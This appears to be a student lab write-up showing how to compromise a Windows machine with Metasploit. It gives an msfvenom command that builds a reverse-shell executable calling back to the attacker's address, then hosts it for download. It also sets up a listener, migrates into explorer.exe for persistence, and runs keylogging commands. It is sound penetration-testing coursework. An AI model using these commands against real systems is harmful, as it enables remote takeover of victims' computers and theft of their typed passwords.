# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:


<img width="712" height="270" alt="image" src="https://github.com/user-attachments/assets/03919afe-ada8-4a52-9bc4-1afab301516c" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:


<img width="793" height="122" alt="image" src="https://github.com/user-attachments/assets/4b787863-3239-47fe-9437-f3ecf0966e79" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="397" height="65" alt="image" src="https://github.com/user-attachments/assets/6fd6d168-b3af-40ec-8148-abd0024081e9" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="442" height="62" alt="image" src="https://github.com/user-attachments/assets/f5e9d775-bcc6-4718-a273-c0d9ceb15762" />

Check the status of apache2
## OUTPUT:

<img width="887" height="316" alt="image" src="https://github.com/user-attachments/assets/d85ba0a1-fc24-4d61-8959-efd6f3c8ba3e" />


Invoke msfconsole:
## OUTPUT:

<img width="810" height="462" alt="image" src="https://github.com/user-attachments/assets/61520abc-81c9-411f-ae15-a2784640e49e" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="990" height="590" alt="image" src="https://github.com/user-attachments/assets/ab7a0fb2-3fff-49cb-b9f6-242a86edaa8a" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="627" height="167" alt="image" src="https://github.com/user-attachments/assets/75ca8d70-0ced-426f-84f2-a01cc32cc0f0" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="957" height="765" alt="image" src="https://github.com/user-attachments/assets/b8b3464c-dde7-46fe-ac0c-e21635e0c8dc" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1536" height="960" alt="image" src="https://github.com/user-attachments/assets/eda95652-4c69-4087-8f24-700e598b9173" />


On kali/parrot give the command exploit
## OUTPUT:
<img width="387" height="36" alt="image" src="https://github.com/user-attachments/assets/67d1cc1e-93be-4dd7-8f2f-50ada7bf2178" />



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="385" height="120" alt="image" src="https://github.com/user-attachments/assets/6186c4b4-8187-4c06-a547-a06c00eac8f3" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="618" height="370" alt="image" src="https://github.com/user-attachments/assets/852ccb87-423d-4a47-8e45-bae91683bc83" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:

<img width="322" height="41" alt="image" src="https://github.com/user-attachments/assets/ef0ff9ae-b974-4dc0-b695-e3fe7379b1fd" />



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="431" height="102" alt="image" src="https://github.com/user-attachments/assets/51707f1e-5fc4-4940-9f11-02b201679813" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
